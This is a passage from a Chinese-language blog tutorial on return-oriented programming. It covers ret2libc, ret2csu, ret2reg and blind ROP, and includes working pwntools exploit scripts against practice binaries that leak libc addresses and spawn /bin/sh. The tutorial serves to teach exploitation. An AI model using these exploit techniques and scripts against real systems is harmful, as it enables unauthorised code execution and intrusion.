class="number">0xffffcf30</span> + <span class="number">0x1c</span>) + <span class="number">0x04</span></span><br><span class="line"><span class="keyword">print</span> ret_offset</span><br><span class="line">sh_addr = <span class="number">0x080be408</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">flat() Parameters:</span></span><br><span class="line"><span class="string">args – Values to flatten</span></span><br><span class="line"><span class="string">preprocessor (function) – Gets called on every element to optionally transform the element before flattening. If None is returned, then the original value is uded.</span></span><br><span class="line"><span class="string">word_size (int) – Word size of the converted integer (in bits).</span></span><br><span class="line"><span class="string">endianness (str) – Endianness of the converted integer (“little”/”big”).</span></span><br><span class="line"><span class="string">sign (str) – Signedness of the converted integer (False/True)</span></span><br><span class="line"><span class="string">即: flat()函数将数组每项以大端/小端,有/无符号,将每项合并.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">"A"</span>*ret_offset, pop_eax_addr, <span class="number">0x0b</span>, pop_edx_ecx_ebx_addr, <span class="number">0</span>, <span class="number">0</span>, sh_addr, int_0x80])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="x24-ret2libc">0x24 ret2libc</h3><p>ret2libc顾名思义即控制程序执行libc中的函数, 通常是返回某个函数的plt或者函数的具体位置. 为了get shell, 我们会执行<code>system('/bin/sh')</code>. 这里需要注意的一点是: <strong>在leak libc中的部分函数地址之后, 我们需要根据对应的libc版本去查找相应的函数偏移.</strong></p><h4 id="存在system函数及binsh情况">① 存在system函数及/bin/sh情况</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ret2libc1'</span>)</span><br><span class="line"></span><br><span class="line">ret_offset = <span class="number">112</span></span><br><span class="line"><span class="comment"># /bin/sh字符串地址</span></span><br><span class="line">shell_addr = <span class="number">0x08048720</span></span><br><span class="line"><span class="comment"># system函数地址</span></span><br><span class="line">system_addr = <span class="number">0x08048460</span></span><br><span class="line"><span class="comment"># 这里addr是随便填写的, 作为函数的返回地址, 具体情况上一篇博客的栈帧结构.</span></span><br><span class="line">payload = flat([<span class="string">"a"</span>*ret_offset, system_addr, <span class="string">"addr"</span>, shell_addr])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'addr' 作为虚假的地址，其后参数对应的参数内容。</p><h4 id="只存在system函数的情况">② 只存在system函数的情况</h4><ol type="1"><li><p>bss段的buf2如下: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)</span><br></pre></td></tr></table></figure></p></li><li><p>pop ebx: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  demo ROPgadget --binary ret2libc2 --only &apos;pop|ret&apos; | grep &apos;ebx&apos;</span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br></pre></td></tr></table></figure></p></li></ol><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *--</span><br><span class="line">sh = process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line"></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line">ret_offset = <span class="number">112</span></span><br><span class="line">system_addr = <span class="number">0x08048490</span></span><br><span class="line">gets_addr = <span class="number">0x08048460</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x0804843d</span></span><br><span class="line"><span class="comment"># 这里如ret2syscall中,先查找能够使用的gadgets, 然后向程序的bss段中的buf2中写入/bin/sh字符串,并将其地址作为system函数的参数传入.</span></span><br><span class="line"><span class="comment"># 跳转的顺序依次是: ①gets函数ret --&gt; ②pop ebx; ret buf2_addr --&gt; ③system函数 + buf2_addr</span></span><br><span class="line">payload = flat([<span class="string">"a"</span>*ret_offset, gets_addr, pop_ebx_addr, buf2_addr, system_addr, <span class="string">"addr"</span>, buf2_addr])                          </span><br><span class="line"><span class="comment"># gets(buf2);</span></span><br><span class="line"><span class="comment"># system('/bin/sh');</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><h4 id="system函数和binsh都不存在的情况">③ system函数和/bin/sh都不存在的情况</h4><blockquote><p>获取system函数的地址:</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，<strong>最低的 12 位(低3位16进制)</strong>并不会发生改变。而 libc 在 github 上有人进行收集.</li><li>https://github.com/niklasb/libc-database</li></ul></blockquote><p><strong>由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><h5 id="ret2libc漏洞利用的基本思路">※ ret2libc漏洞利用的基本思路</h5><blockquote><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">===========================================================================</span><br><span class="line">.got.plt:0804A000</span><br><span class="line">.got.plt:0804A000 ; Segment type: Pure data</span><br><span class="line">.got.plt:0804A000 ; Segment permissions: Read/Write</span><br><span class="line">.got.plt:0804A000 _got_plt        segment dword public &apos;DATA&apos; use32</span><br><span class="line">.got.plt:0804A000                 assume cs:_got_plt</span><br><span class="line">.got.plt:0804A000                 ;org 804A000h</span><br><span class="line">.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048420↑r</span><br><span class="line">.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048420+6↑r</span><br><span class="line">.got.plt:0804A00C off_804A00C     dd offset printf        ; DATA XREF: _printf↑r</span><br><span class="line">.got.plt:0804A010 off_804A010     dd offset gets          ; DATA XREF: _gets↑r</span><br><span class="line">.got.plt:0804A014 off_804A014     dd offset time          ; DATA XREF: _time↑r</span><br><span class="line">.got.plt:0804A018 off_804A018     dd offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset __gmon_start__</span><br><span class="line">.got.plt:0804A01C                                         ; DATA XREF: ___gmon_start__↑r</span><br><span class="line">.got.plt:0804A020 off_804A020     dd offset srand         ; DATA XREF: _srand↑r</span><br><span class="line">.got.plt:0804A024 off_804A024     dd offset __libc_start_main 0804A024</span><br><span class="line">.got.plt:0804A024                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A028 off_804A028     dd offset setvbuf       ; DATA XREF: _setvbuf↑r</span><br><span class="line">.got.plt:0804A02C off_804A02C     dd offset rand          ; DATA XREF: _rand↑r</span><br><span class="line">.got.plt:0804A030 off_804A030     dd offset __isoc99_scanf</span><br><span class="line">.got.plt:0804A030                                         ; DATA XREF: ___isoc99_scanf↑r</span><br><span class="line">.got.plt:0804A030 _got_plt        ends</span><br><span class="line">.got.plt:0804A030</span><br><span class="line">.data:0804A034 ; ===========================================================================</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"><span class="comment"># 获取plt中puts的地址</span></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line"><span class="comment"># 获取got表中的libc</span></span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="comment"># print "libc_start_main_go:",hex(libc_start_main_got)</span></span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]</span><br><span class="line"><span class="comment"># print "main:",hex(main)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak libc_start_main_got addr and return to main again"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get the related addr"</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="comment"># libc_start_main_addr = 0xf7d20d90</span></span><br><span class="line"><span class="comment"># print "leak libc start main addr: ", hex(libc_start_main_addr)</span></span><br><span class="line"><span class="comment"># print 'normal libc start main addr: ', hex(0xf7d20d90)</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># libc = LibcSearcher('__libc_start_main', libc_start_main_addr)</span></span><br><span class="line"><span class="comment"># libcbase = libc_start_main_addr - libc.dump('__libc_start_main')</span></span><br><span class="line"><span class="comment"># binsh_offset = 0x0017b8cf - 0x00018d90</span></span><br><span class="line"><span class="comment"># system_offset = 0x0003cd10 - 0x00018d90</span></span><br><span class="line"><span class="comment"># system_addr = libcbase + libc.dump('system')</span></span><br><span class="line"><span class="comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span></span><br><span class="line"></span><br><span class="line">system_offset = <span class="number">0x24470</span></span><br><span class="line">binsh_offset = <span class="number">0x16533f</span></span><br><span class="line">system_addr = system_offset + libc_start_main_addr</span><br><span class="line">binsh_addr = binsh_offset + libc_start_main_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="x30-中级rop">0x30 中级ROP</h2><h3 id="x31-ret2csu">0x31 ret2csu</h3><h4 id="使用原理">① 使用原理</h4><p>在64位程序中, 函数调用的前六个参数是通过寄存器传参的(<code>rdi, rsi, rdx, rcx, r8, r9</code>), 其余的参数才是通过压栈的形式传参. 但是一般在程序中很少有连续的这么多pop寄存器的gadgets, 这时候就需要利用到libc的初始化函数:<code>__libc_csu_init</code>, 这个函数只要调用了libc就有, 而大部分程序都会调用libc, 所以这个函数在绝大部分程序中都会出现. 函数的二进制形式如下:(不同libc版本大致相同)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005A0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005A0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005A0</span><br><span class="line">.text:00000000004005A0 var_30          = qword ptr -30h</span><br><span class="line">.text:00000000004005A0 var_28          = qword ptr -28h</span><br><span class="line">.text:00000000004005A0 var_20          = qword ptr -20h</span><br><span class="line">.text:00000000004005A0 var_18          = qword ptr -18h</span><br><span class="line">.text:00000000004005A0 var_10          = qword ptr -10h</span><br><span class="line">.text:00000000004005A0 var_8           = qword ptr -8</span><br><span class="line">.text:00000000004005A0</span><br><span class="line">.text:00000000004005A0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005A0                 mov     [rsp+var_28], rbp</span><br><span class="line">.text:00000000004005A5                 mov     [rsp+var_20], r12</span><br><span class="line">.text:00000000004005AA                 lea     rbp, cs:600E24h</span><br><span class="line">.text:00000000004005B1                 lea     r12, cs:600E24h</span><br><span class="line">.text:00000000004005B8                 mov     [rsp+var_18], r13</span><br><span class="line">.text:00000000004005BD                 mov     [rsp+var_10], r14</span><br><span class="line">.text:00000000004005C2                 mov     [rsp+var_8], r15</span><br><span class="line">.text:00000000004005C7                 mov     [rsp+var_30], rbx</span><br><span class="line">.text:00000000004005CC                 sub     rsp, 38h</span><br><span class="line">.text:00000000004005D0                 sub     rbp, r12</span><br><span class="line">.text:00000000004005D3                 mov     r13d, edi</span><br><span class="line">.text:00000000004005D6                 mov     r14, rsi</span><br><span class="line">.text:00000000004005D9                 sar     rbp, 3</span><br><span class="line">.text:00000000004005DD                 mov     r15, rdx</span><br><span class="line">.text:00000000004005E0                 call    _init_proc</span><br><span class="line">.text:00000000004005E5                 test    rbp, rbp</span><br><span class="line">.text:00000000004005E8                 jz      short loc_400606</span><br><span class="line">.text:00000000004005EA                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005EC                 nop     dword ptr [rax+00h]</span><br><span class="line">.text:00000000004005F0</span><br><span class="line">.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j</span><br><span class="line">.text:00000000004005F0                 mov     rdx, r15</span><br><span class="line">.text:00000000004005F3                 mov     rsi, r14</span><br><span class="line">.text:00000000004005F6                 mov     edi, r13d</span><br><span class="line">.text:00000000004005F9                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004005FD                 add     rbx, 1</span><br><span class="line">.text:0000000000400601                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400604                 jnz     short loc_4005F0</span><br><span class="line">.text:0000000000400606</span><br><span class="line">.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j</span><br><span class="line">.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610                 mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615                 mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A                 mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F                 mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624                 add     rsp, 38h</span><br><span class="line">.text:0000000000400628                 retn</span><br><span class="line">.text:0000000000400628 ; &#125; // starts at 4005A0</span><br><span class="line">.text:0000000000400628 __libc_csu_init endp</span><br></pre></td></tr></table></figure><blockquote><p>我们主要利用顺序如下:</p><ol type="1"><li><code>0x0000000000400606~0000000000400628</code>, (利用栈溢出构造栈上数据)依次修改<code>rbx, rbp, r12, r13, r14, r15</code>六个寄存器的值.(这里需要注意的是rsp是栈顶指针, 可能不是从rsp开始压入rbx, 上面的<code>var_30</code>就是从<code>rsp+8</code>开始压栈的, 所以写payload的时候需要加上一个<code>p64(0)</code>)</li><li>上面修改的寄存器的值是为接下来的<code>0x00000000004005F0~0x0000000000400604</code>这段代码服务的, 我们通过修改<code>rdx, rsi, edi</code>的值来当做下一步<code>call qword ptr [r12+rbx*8]</code>的参数, 这样只要我们把rbx设为0, 把r12的值设为我们想要跳转到函数的got地址即可.</li><li><code>0x000000000040060D~0x0000000000400614</code>, 我们为了不让它循环(往下执行), 而在上面已经把rbx设为0, 因此需要在第1步把rbp的值设为1</li></ol></blockquote><h4 id="使用情形">② 使用情形</h4><blockquote><ol type="1"><li>程序中pop参数的gadgets比较少, 或者不是连续的;</li><li>存在栈溢出</li></ol></blockquote><h4 id="使用例题">③ 使用例题</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> _FORTIFY_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">true<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">trueread(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">truewrite(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">truevulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./ret2csu'</span>)</span><br><span class="line">sh = process(<span class="string">'./ret2csu'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x4005F0</span></span><br><span class="line">csu_end_addr = <span class="number">0x400606</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdx=r15 第3个参数</span></span><br><span class="line">    <span class="comment"># rsi=r14 第2个参数</span></span><br><span class="line">    <span class="comment"># rdi=edi=r13d 第1个参数</span></span><br><span class="line">    <span class="comment"># 这里之所有要加一个p64(0),是因为pop操作不是从rsp而是从rsp+8开始的</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x88</span></span><br><span class="line">    payload += p64(csu_end_addr) + p64(<span class="number">0</span>) + p64(rbx)\</span><br><span class="line">        + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    <span class="comment"># 填充栈上pop/add,共0x38个字节</span></span><br><span class="line">    payload += <span class="string">'b'</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1 in order to leak write_addr</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment"># RDI, RSI, RDX, RCX, R8, R9, more on the stack</span></span><br><span class="line"><span class="comment"># write(1,write_got,8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main_addr)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">execve_off = libc.symbols[<span class="string">'write'</span>]-libc.symbols[<span class="string">'execve'</span>]</span><br><span class="line">execve_addr = write_addr - execve_off</span><br><span class="line">log.success(<span class="string">'execve_addr: '</span> + hex(execve_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0,bss_base,16)</span></span><br><span class="line"><span class="comment"># read execve_addr and /bin/sh\x00</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_base, <span class="number">16</span>, main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment"># sh.recv()</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment"># execve(bss_base+8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_base, bss_base + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><hr><h3 id="x32-ret2reg">0x32 ret2reg</h3><h4 id="使用原理-1">① 使用原理</h4><p>ret2reg(return-to-address)主要目的是绕过地址随机化(Address Space Layout Randomization, ASLR). 顾名思义, 就是控制寄存器的值, 利用<code>call, jnz, jmp</code>等跳转指令控制程序执行流以跳转到payload.</p><h4 id="使用步骤">② 使用步骤</h4><ol type="1"><li>调试程序, 查看溢出函数返回时哪个寄存器的值指向溢出缓冲区.</li><li>经第1步得知reg寄存器指向缓冲区, 查找漏洞程序中<code>call reg</code>或<code>jmp reg</code>指令.(可利用objdump或ROPgadget) 然后将EIP的值指向该指令的地址.</li><li>在reg指向的栈空间写入shellcode</li></ol><h4 id="参考链接">③ 参考链接</h4><p>第一篇: <a href="https://blog.csdn.net/linyt/article/details/43612409" target="_blank" rel="noopener">使用ret2reg攻击绕过地址混淆</a></p><p>第二篇: <a href="http://spd.dropsec.xyz/2016/11/02/ret2reg%E6%8A%80%E6%9C%AF/" target="_blank" rel="noopener">使用ret2reg攻击绕过地址混淆</a></p><p>第三篇: <a href="https://silic.wiki/%E4%B9%A0%E7%A7%91%E6%97%A7%E7%AB%99:ret2reg%E6%8C%87%E4%BB%A4%E7%BB%95%E8%BF%87aslr%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA" target="_blank" rel="noopener">ret2reg指令绕过ASLR堆栈溢出</a></p><hr><h3 id="x33-brop">0x33 BROP</h3><h4 id="使用原理-2">① 使用原理</h4><p>BROP(Blind Return Oriented Programming), 顾名思义, 是一种盲ROP, 在<strong>没有源程序分析</strong>的情况下对目标远程程序进行攻击, 劫持程序执行流. 这种方式在一般情况下可以绕过ASLR、NX、Canary保护. 但是使用这种方式有两个条件:</p><blockquote><ol type="1"><li>目标服务(程序)存在栈溢出</li><li>运行远程程序的服务端在崩溃之后会重新启动, 或者重启后地址与先前的一样.(即使程序由ASLR保护, 仅仅在最初启动有效果). 目前Nginx, MySQL, Apache, OpenSSH等服务器应用都符合这种特性.</li></ol></blockquote><h4 id="使用步骤-1">② 使用步骤</h4><ol type="1"><li><p><strong>Get buffer length</strong></p><p>通过爆破实现, 从1开始爆破, 直到程序崩溃(ebp/rbp)被覆盖. 此时输入的字符串长度即为栈溢出长度.</p></li><li><p><strong>Stack Reading</strong></p><p>获取栈上的canary, ebp, return address.</p><p>经典栈结构如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer|canary|fame pointer(ebp/rbp)|return address</span><br></pre></td></tr></table></figure><blockquote><p>我们同样可以通过逐字节爆破, 爆破canary.(<strong>32位爆破4x256=1024次, 64位爆破8x256=2048次</strong>, 注意这里的4和8代表的是字节数, 256是表示每个字节由256中可能) 同样地, 我们可以爆破出栈基址指针、返回地址的值.</p></blockquote></li><li><p><strong>Blind ROP</strong></p><p>经过上面两部, 我们可以控制溢出后的执行流, 这时我们就尝试跳转到gadgets, 根据有无crash来判断这个gadgets是否有效, 得到输出函数如: put, write等, 以此来leak出更多的信息.</p></li><li><p><strong>Optimization</strong></p><p>上一步已经leak出重要函数(如: 